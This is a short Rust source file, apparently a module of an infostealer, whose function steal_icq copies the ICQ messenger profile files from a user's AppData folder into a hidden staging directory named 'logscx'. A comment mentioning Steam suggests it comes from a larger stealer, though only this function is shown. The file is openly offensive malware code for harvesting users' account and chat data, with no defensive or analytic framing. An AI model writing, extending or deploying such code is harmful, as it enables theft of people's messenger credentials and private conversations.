use walkdir::*;

pub fn steal_icq() {

    let path_str = format!("{}\\ICQ\\0001\\", std::env::var("APPDATA").unwrap());
    let path = std::path::Path::new(&path_str);

    if !path.exists() {
        return;
    }

    std::fs::create_dir(format!("{}\\logscx\\ICQ\\", std::env::var("LOCALAPPDATA").unwrap())).unwrap();

    

    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
           
       let _ =  std::fs::copy(entry.path(), &format!("{}\\logscx\\ICQ\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())); // Copy Steam shit
    }




}